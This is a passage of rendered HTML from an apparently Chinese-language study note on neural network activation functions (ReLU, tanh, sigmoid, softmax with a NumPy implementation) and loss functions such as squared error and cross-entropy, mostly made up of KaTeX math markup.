class="markdownIt-Anchor" href="#relu函数"></a> ReLu函数</h3><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>l</mi><mi>u</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mrow><mn>0</mn><mo separator="true">,</mo><mi>x</mi></mrow></mrow><annotation encoding="application/x-tex">relu(x)=max{0,x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span></span></span></span></span></span></p><h3 id="tanh函数"><a class="markdownIt-Anchor" href="#tanh函数"></a> tanh函数</h3><ul><li>tanh函数趋近0的速度比sigmoid更为快</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = np.linspace(<span class="number">-10</span>,<span class="number">10</span>)</span><br><span class="line">y = np.tanh(x)</span><br></pre></td></tr></table></figure><h3 id="二分类"><a class="markdownIt-Anchor" href="#二分类"></a> 二分类</h3><ul><li>使用sigmoid函数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>σ</mi><mo stretchy="false">(</mo><msup><mi>ω</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><mi>exp</mi><mo>⁡</mo><mrow><mo>−</mo><mo stretchy="false">(</mo><msup><mi>ω</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">\sigma(\omega^Tx+b)=\frac{1}{1+\exp{-(\omega^Tx+b)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3719729999999999em;vertical-align:-0.5268649999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.648135em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mop mtight">exp</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight">−</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7740928571428571em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault mtight">x</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">b</span><span class="mclose mtight">)</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5268649999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li>条件概率为：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mi>w</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>σ</mi><mo stretchy="false">(</mo><msup><mi>ω</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_w(y=1|x)=\sigma(\omega^Tx+b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mi>w</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo>=</mo><mn>0</mn><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><mi>σ</mi><mo stretchy="false">(</mo><msup><mi>ω</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_w(y=0|x)=1-\sigma(\omega^Tx+b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span></li></ul><h3 id="多分类"><a class="markdownIt-Anchor" href="#多分类"></a> 多分类</h3><h4 id="softmax"><a class="markdownIt-Anchor" href="#softmax"></a> softmax</h4><ul><li>假设有一个数组V，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示V中的第i个元素，那么这个元素的softmax值为:</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><mfrac><msup><mi>e</mi><mi>i</mi></msup><mrow><msub><mo>∑</mo><mi>j</mi></msub><msup><mi>e</mi><mi>j</mi></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">S_i=\frac{e^i}{\sum_j{e^j}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6926869999999998em;vertical-align:-0.667227em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0254599999999998em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.14964714285714287em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.46032428571428574em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7570857142857144em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9020857142857143em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.667227em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li>把大范围的输入转为[0,1]范围的概率形式</li></ul><p><img src="/images/pasted-102.png" alt="softmax" /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">softmax</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x.ndim == <span class="number">2</span>:</span><br><span class="line">        x = x.T</span><br><span class="line">        x = x - np.max(x, axis=<span class="number">0</span>)</span><br><span class="line">        y = np.exp(x) / np.sum(np.exp(x), axis=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> y.T </span><br><span class="line">    x = x - np.max(x) <span class="comment"># 防止x过大导致exp结果溢出</span></span><br><span class="line">    <span class="keyword">return</span> np.exp(x) / np.sum(np.exp(x))</span><br></pre></td></tr></table></figure><h2 id="损失函数"><a class="markdownIt-Anchor" href="#损失函数"></a> 损失函数</h2><p>又称目标函数(objective function)，或误差函数(error function)，或代价函数（cost function） , 或经验风险(empirical risk)；用来度量网络实际输出与期望输出之间的不一致程度，指导网络的参数学习和表示学习。</p><h3 id="回归问题"><a class="markdownIt-Anchor" href="#回归问题"></a> 回归问题</h3><ul><li>SSE（Sum of Squared Error）均方误差和</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>m</mi></mrow></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><mrow><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><msup><mi>x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo><mo>−</mo><msup><mi>y</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mo>+</mo><mi>λ</mi><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msubsup><mi>θ</mi><mi>j</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">J(\theta)=\frac{1}{2m}\sum_{i=1}^{m}{(h_\theta(x^{(i)})-y^{(i)})^2}+\lambda\sum_{j=1}^{n}{\theta^2_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2329999999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathdefault mtight">m</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2499259999999999em;vertical-align:-0.43581800000000004em;"></span><span class="mord mathdefault">λ</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span></span></span></span></span></li></ul><h3 id="分类问题"><a class="markdownIt-Anchor" href="#分类问题"></a> 分类问题</h3><ul><li><p>CE（Cross Entropy）交叉熵，对数损失</p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><mrow><msup><mi>y</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mi>ln</mi><mo>⁡</mo><mrow><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><msup><mi>x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msup><mi>y</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo><mi>ln</mi><mo>⁡</mo><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><msup><mi>x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo></mrow><mo stretchy="false">)</mo></mrow></mrow><mo>+</mo><mi>λ</mi><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msubsup><mi>θ</mi><mi>j</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">J(\theta)=-\frac{1}{m}\sum_{i=1}^{m}{y^{(i)}\ln{h_\theta(x^{(i)})+(1-y^{(i)})\ln{(1-h_\theta(x^{(i)})})}}+\lambda\sum^{n}_{j=1}{\theta^2_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2329999999999999em;vertical-align:-0.345em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord 